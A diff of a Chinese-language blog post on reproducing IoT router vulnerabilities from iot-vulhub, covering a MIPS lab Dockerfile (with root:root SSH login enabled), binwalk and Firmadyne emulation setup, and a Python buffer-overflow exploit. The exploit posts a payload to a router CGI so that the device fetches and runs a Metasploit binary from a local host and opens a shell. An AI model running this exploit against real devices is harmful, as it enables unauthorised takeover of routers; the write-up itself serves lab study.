-    && sed -i <span class="string">"s/PermitRootLogin prohibit-password/PermitRootLogin yes/g"</span> /etc/ssh/sshd_config && echo <span class="string">"root:root"</span> | chpasswd && echo <span class="string">"GatewayPorts yes"</span> >>  /etc/ssh/sshd_config \                                                                                               
-   <span class="comment"># && git clone --depth=1 https://github.com/hugsy/gef.git \   </span>
-    && git clone --depth=<span class="number">1</span> https://github.com/longld/peda.git ~/peda \
-   <span class="comment"># && cp gef/gef.py ~/.gef.py && echo "source ~/.gef.py" > ~/.gdbinit && echo "export LC_CTYPE=C.UTF-8" >> ~/.bashrc \    </span>
-    && echo <span class="string">"source ~/peda/peda.py"</span> >> ~/.gdbinit && echo <span class="string">"export LC_CTYPE=C.UTF-8"</span> >> ~/.bashrc \ 
-    && python3 -m pip install --upgrade pwntools \                                                                                       
-    && apt-get purge -y --autoremove git \                                                                                               
-    && rm -rf /var/lib/apt/lists/* /root/gef                                                                                             
-                                                                                                                                         
-<span class="comment">#RUN mkdir images && cd images \                                                                                                         </span>
-<span class="comment">#    && wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2                                          </span>
-<span class="comment">#    && wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta                                                    </span>
-                                                                                                                                         
-<span class="keyword">COPY</span><span class="language-bash"> ./images /root/images</span></code></pre>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> firmianay/ubuntu1604                                                                                                                </span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;firmianay@gmail.com&quot;</span>                                                                                                       </span></span><br><span class="line">                                                                                                                                         </span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root                                                                                                                            </span></span><br><span class="line">                                                                                                                                         </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update \                                                                                                                     </span></span><br><span class="line">    &amp;&amp; apt-get install -y qemu-system-mipsel \                                                                                           </span><br><span class="line">    &amp;&amp; apt-get install -y --no-install-recommends bridge-utils uml-utilities expect gdb-multiarch git python3-dev openssh-server netcat curl libssl-dev libffi-dev build-essential tcpdump \                                                                                      </span><br><span class="line">    &amp;&amp; sed -i <span class="string">&quot;s/PermitRootLogin prohibit-password/PermitRootLogin yes/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; echo <span class="string">&quot;root:root&quot;</span> | chpasswd &amp;&amp; echo <span class="string">&quot;GatewayPorts yes&quot;</span> &gt;&gt;  /etc/ssh/sshd_config \                                                                                               </span><br><span class="line">   <span class="comment"># &amp;&amp; git clone --depth=1 https://github.com/hugsy/gef.git \   </span></span><br><span class="line">    &amp;&amp; git clone --depth=<span class="number">1</span> https://github.com/longld/peda.git ~/peda \</span><br><span class="line">   <span class="comment"># &amp;&amp; cp gef/gef.py ~/.gef.py &amp;&amp; echo &quot;source ~/.gef.py&quot; &gt; ~/.gdbinit &amp;&amp; echo &quot;export LC_CTYPE=C.UTF-8&quot; &gt;&gt; ~/.bashrc \    </span></span><br><span class="line">    &amp;&amp; echo <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit &amp;&amp; echo <span class="string">&quot;export LC_CTYPE=C.UTF-8&quot;</span> &gt;&gt; ~/.bashrc \ </span><br><span class="line">    &amp;&amp; python3 -m pip install --upgrade pwntools \                                                                                       </span><br><span class="line">    &amp;&amp; apt-get purge -y --autoremove git \                                                                                               </span><br><span class="line">    &amp;&amp; rm -rf /var/lib/apt/lists/* /root/gef                                                                                             </span><br><span class="line">                                                                                                                                         </span><br><span class="line"><span class="comment">#RUN mkdir images &amp;&amp; cd images \                                                                                                         </span></span><br><span class="line"><span class="comment">#    &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2                                          </span></span><br><span class="line"><span class="comment">#    &amp;&amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta                                                    </span></span><br><span class="line">                                                                                                                                         </span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./images /root/images</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -406,41 +400,7 @@ thread.join()</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406271207669.png" alt="image-20240627120718622"></p>
 <p>exp:</p>
 <p>msf生成的exp</p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!/usr/bin/python3</span>
-
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">import</span> requests
-<span class="keyword">from</span> threading <span class="keyword">import</span> Thread
-
-context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)
-
-system = <span class="number">0x0047A610</span>
-
-cmd  = <span class="string">&#x27;\n&#x27;</span>
-cmd += <span class="string">&#x27;wget http://192.168.2.1:8000/tools/msf -O /msf\n&#x27;</span>
-cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span>
-cmd += <span class="string">&#x27;/msf\n&#x27;</span>
-
-<span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) < <span class="number">0x55</span>)
-
-payload = <span class="string">b"status_guestnet.asp"</span> + cmd.ljust(<span class="number">0x55</span>,<span class="string">&#x27;a&#x27;</span>).encode() + p32(system) 
-data = &#123;<span class="string">"cmac"</span>:<span class="string">"12:af:aa:bb:cc:dd"</span>, <span class="string">"submit_button"</span>:payload, <span class="string">"cip"</span>:<span class="string">"192.168.100.1"</span>&#125;
-
-<span class="keyword">def</span> <span class="title function_">attack</span>():
-    <span class="keyword">try</span>:
-        requests.post(<span class="string">"http://192.168.2.2/guest_logout.cgi"</span>, data=data, timeout=<span class="number">1</span>)
-    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:
-        <span class="built_in">print</span>(e)
-
-thread = Thread(target=attack)
-thread.start()
-
-io = listen(<span class="number">31337</span>)
-io.wait_for_connection()
-log.success(<span class="string">"getshell"</span>)
-io.interactive()
-
-thread.join()</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x0047A610</span></span><br><span class="line"></span><br><span class="line">cmd  = <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;wget http://192.168.2.1:8000/tools/msf -O /msf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;chmod 777 /msf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;/msf\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">0x55</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;status_guestnet.asp&quot;</span> + cmd.ljust(<span class="number">0x55</span>,<span class="string">&#x27;a&#x27;</span>).encode() + p32(system) </span><br><span class="line">data = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>, <span class="string">&quot;submit_button&quot;</span>:payload, <span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.100.1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(<span class="string">&quot;http://192.168.2.2/guest_logout.cgi&quot;</span>, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">thread = Thread(target=attack)</span><br><span class="line">thread.start()</span><br><span class="line"></span><br><span class="line">io = listen(<span class="number">31337</span>)</span><br><span class="line">io.wait_for_connection()</span><br><span class="line">log.success(<span class="string">&quot;getshell&quot;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">thread.join()</span><br></pre></td></tr></table></figure>
 
 
 
@@ -462,17 +422,7 @@ thread.join()</code></pre>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/VxerLee/p/16427304.html">零基础学IoT Pwn</a></p>
 <p>本地ubuntu22.04虚拟机搭建IOT环境</p>
 <h3 id="binwalk固件解包工具"><a href="#binwalk固件解包工具" class="headerlink" title="binwalk固件解包工具"></a>binwalk固件解包工具<a id="binwalk"></a></h3><p><a target="_blank" rel="noopener" href="https://github.com/ReFirmLabs/binwalk">ReFirmLabs&#x2F;binwalk: Firmware Analysis Tool (github.com)</a></p>
-<pre class=" language-highlight shell"><code class="language-highlight shell">git clone https://github.com/ReFirmLabs/binwalk.git
-<span class="meta prompt_"></span>
-<span class="meta prompt_">#</span><span class="language-bash">依赖项包含在deps.sh中</span>
-./.deps.sh
-<span class="meta prompt_">#</span><span class="language-bash">一些依赖工具</span>
-sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord
-
-sudo python3 setup.py install
-<span class="meta prompt_"></span>
-<span class="meta prompt_">#</span><span class="language-bash">卸载</span>
-sudo python3 setup.py uninstall</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">依赖项包含在deps.sh中</span></span><br><span class="line">./.deps.sh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">一些依赖工具</span></span><br><span class="line">sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord</span><br><span class="line"></span><br><span class="line">sudo python3 setup.py install</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">卸载</span></span><br><span class="line">sudo python3 setup.py uninstall</span><br></pre></td></tr></table></figure>
 
 
 
@@ -484,65 +434,48 @@ sudo python3 setup.py uninstall</code></pre>
 <li>For emulating Linux binaries: <code>apt-get install qemu-user-static</code></li>
 </ul>
 <h3 id="Firmadyne-固件仿真工具"><a href="#Firmadyne-固件仿真工具" class="headerlink" title="Firmadyne 固件仿真工具"></a>Firmadyne 固件仿真工具<a id="firmadyne"></a></h3><p><a target="_blank" rel="noopener" href="https://github.com/firmadyne/firmadyne#introduction">firmadyne&#x2F;firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware (github.com)</a></p>
-<pre class=" language-highlight shell"><code class="language-highlight shell">git clone --recursive https://github.com/firmadyne/firmadyne.git    #克隆项目以及子项目</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/firmadyne/firmadyne.git    #克隆项目以及子项目</span><br></pre></td></tr></table></figure>
 
 <p>安装postgresql数据库</p>
-<pre class=" language-highlight shell"><code class="language-highlight shell">sudo apt-get install postgresql
-sudo -u postgres createuser -P firmadyne  #密码设置为firmadyne
-sudo -u postgres createdb -O firmadyne firmware
-sudo -u postgres psql -d firmware < ./firmadyne/database/schema</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install postgresql</span><br><span class="line">sudo -u postgres createuser -P firmadyne  #密码设置为firmadyne</span><br><span class="line">sudo -u postgres createdb -O firmadyne firmware</span><br><span class="line">sudo -u postgres psql -d firmware &lt; ./firmadyne/database/schema</span><br></pre></td></tr></table></figure>
 
 <p>检查数据库是否配置完成</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">sudo -u postgres psql -d firmware   #连接到数据库
-\dt                       #列出所有表
-\d table_name                 #查看表结构
-SELECT * FROM table_name;        #查看表中数据
-\q                       #退出</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres psql -d firmware   #连接到数据库</span><br><span class="line">\dt                       #列出所有表</span><br><span class="line">\d table_name                 #查看表结构</span><br><span class="line">SELECT * FROM table_name;        #查看表中数据</span><br><span class="line">\q                       #退出</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170913673.png" alt="image-20240717091308539"></p>
 <p>下载需要的二进制工具</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">sudo ./download.sh
-ls ./binaries/   #检查安装完成</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./download.sh</span><br><span class="line">ls ./binaries/   #检查安装完成</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170913451.png" alt="image-20240717091350377"></p>
 <h3 id="模拟运行固件"><a href="#模拟运行固件" class="headerlink" title="模拟运行固件"></a>模拟运行固件<a id="action"></a></h3><p>清理环境</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">sudo su
-./reset.py</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">./reset.py</span><br></pre></td></tr></table></figure>
 
 <p>提取固件包并保存镜像</p>
-<pre class=" language-highlight shell"><code class="language-highlight shell">./sources/extractor/extractor.py -b Dlink -sql 127.0.0.1 -np -nk DIR822A1_FW103WWb03.bin  images
-<span class="meta prompt_">#</span><span class="language-bash">-b  指定固件所属品牌</span>
-<span class="meta prompt_">#</span><span class="language-bash">-sql 连接本地数据库</span>
-<span class="meta prompt_">#</span><span class="language-bash">-np 不使用并行模式，这个参数告诉脚本不使用并行处理，通常用于调试或在资源有限的系统上运行时使用</span>
-<span class="meta prompt_">#</span><span class="language-bash">-nk 不保留提取的固件镜像</span></code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./sources/extractor/extractor.py -b Dlink -sql 127.0.0.1 -np -nk DIR822A1_FW103WWb03.bin  images</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-b  指定固件所属品牌</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-sql 连接本地数据库</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-np 不使用并行模式，这个参数告诉脚本不使用并行处理，通常用于调试或在资源有限的系统上运行时使用</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-nk 不保留提取的固件镜像</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170935339.png" alt="image-20240717093500277"></p>
 <p>识别CPU架构</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scripts/getArch.sh ./images/2.tar.gz</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/getArch.sh ./images/2.tar.gz</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407170936295.png" alt="image-20240717093612247"></p>
 <p>创建镜像</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scripts/makeImage.sh id</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/makeImage.sh id</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171034660.png" alt="image-20240717103423529"></p>
 <p>存储数据库</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scripts/tar2db.py -i id -f ./images/3.tar.gz
-
-#数据库查看
-sudo -u postgres psql -d firmware 
-SELECT * FROM image WHERE id = 3;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./scripts/tar2db.py -i id -f ./images/3.tar.gz</span><br><span class="line"></span><br><span class="line">#数据库查看</span><br><span class="line">sudo -u postgres psql -d firmware </span><br><span class="line">SELECT * FROM image WHERE id = 3;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>设置网络接口</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scripts/inferNetwork.sh id</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/inferNetwork.sh id</span><br></pre></td></tr></table></figure>
 
 
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171033321.png" alt="image-20240717103310256"></p>
 <p>然后本地会生成一个同网段的网卡</p>
 <p>运行固件</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./scratch/id/run.sh</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scratch/id/run.sh</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171040100.png" alt="image-20240717104031046"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171039126.png" alt="image-20240717103956988"></p>
@@ -553,8 +486,7 @@ SELECT * FROM image WHERE id = 3;</code></pre>
 <p>用iot-vulhub里面提供的exp打通</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171118223.png" alt="image-20240717111850093"></p>
 <p>服务关闭</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">netstat -lnp  #查看qemu服务PID
-kill -9 pid</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -lnp  #查看qemu服务PID</span><br><span class="line">kill -9 pid</span><br></pre></td></tr></table></figure>
 
 
 
@@ -563,12 +495,10 @@ kill -9 pid</code></pre>
 <p>模拟固件过程中使用数据库来记录和统计固件信息，有时这一行为是无用功，<a target="_blank" rel="noopener" href="https://wzt.ac.cn/2021/08/15/firmadyne3/">固件模拟 Case Study (3) | CataLpa’s Site (wzt.ac.cn)</a>这位师傅是将firmadyne中写入数据库的代码进行了删改</p>
 <p>FAT项目基于Firmadyne进行了更改，不使用PostgreSQL数据库存储设备信息。</p>
 <p>下载 Firmware Analysis Toolkit</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">git clone https://github.com/attify/firmware-analysis-toolkit.git</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/attify/firmware-analysis-toolkit.git</span><br></pre></td></tr></table></figure>
 
 <p>改fat.config文件中的配置信息</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">[DEFAULT]
-sudo_password=Your_Root_pwd
-firmadyne_path=Your_firmadyne_Path</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">sudo_password=Your_Root_pwd</span><br><span class="line">firmadyne_path=Your_firmadyne_Path</span><br></pre></td></tr></table></figure>
 
 <p>设置的网络接口为空，虽然跑起来了，但是ifconfig没有网卡信息，服务没起起来</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407171324298.png" alt="image-20240717132423058"></p>
@@ -591,22 +521,151 @@ firmadyne_path=Your_firmadyne_Path</code></pre>
 <p>从这开始，环境的构建将不依赖于dokcer环境，而是通过本地来模拟环境。</p>
 <hr>
 <p>ing。。。</p>
-</main>
 
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://tw11ty.github.io/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/" data-id="cm1apfr7100010sjwhrcr512o" data-title="Iot-vulhub复现" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2024春秋杯夏季赛pwn
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2024ciscn分区赛-pwn复现</div>
+    </a>
+  
+</nav>
+
+  
 </article>
 
 
-<script src="/js/highlight.js"></script>
+</section>
+        
+          <aside id="sidebar">
+  
+    
 
-  </main>
-  <footer class="footer">
   
-  <span>Copyright © 2024 typo</span>
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/IO/" rel="tag">IO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arm/" rel="tag">arm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ciscn/" rel="tag">ciscn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exit-IO/" rel="tag">exit &amp; IO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fmt/" rel="tag">fmt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writewp/" rel="tag">writewp</a></li></ul>
+    </div>
+  </div>
+
+
   
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/IO/" style="font-size: 10px;">IO</a> <a href="/tags/IOT/" style="font-size: 10px;">IOT</a> <a href="/tags/arm/" style="font-size: 10px;">arm</a> <a href="/tags/ciscn/" style="font-size: 10px;">ciscn</a> <a href="/tags/exit-IO/" style="font-size: 10px;">exit & IO</a> <a href="/tags/fmt/" style="font-size: 10px;">fmt</a> <a href="/tags/writewp/" style="font-size: 20px;">writewp</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">June 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/07/15/WKCTF-pwn/">WKCTF-pwn</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/12/arm-pwn%E5%85%A5%E9%97%A8/">arm-pwn入门</a>
+          </li>
+        
+          <li>
+            <a href="/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/">2024春秋杯夏季赛pwn</a>
+          </li>
+        
+          <li>
+            <a href="/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/">Iot-vulhub复现</a>
+          </li>
+        
+          <li>
+            <a href="/2024/06/25/2024ciscn%E5%88%86%E5%8C%BA%E8%B5%9B-pwn%E5%A4%8D%E7%8E%B0/">2024ciscn分区赛-pwn复现</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 tw11ty<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
 </footer>
+
+    </div>
+    <nav id="mobile-nav">
   
-<script src="/js/theme.js"></script>
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
 
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
 </body>
-
 </html>
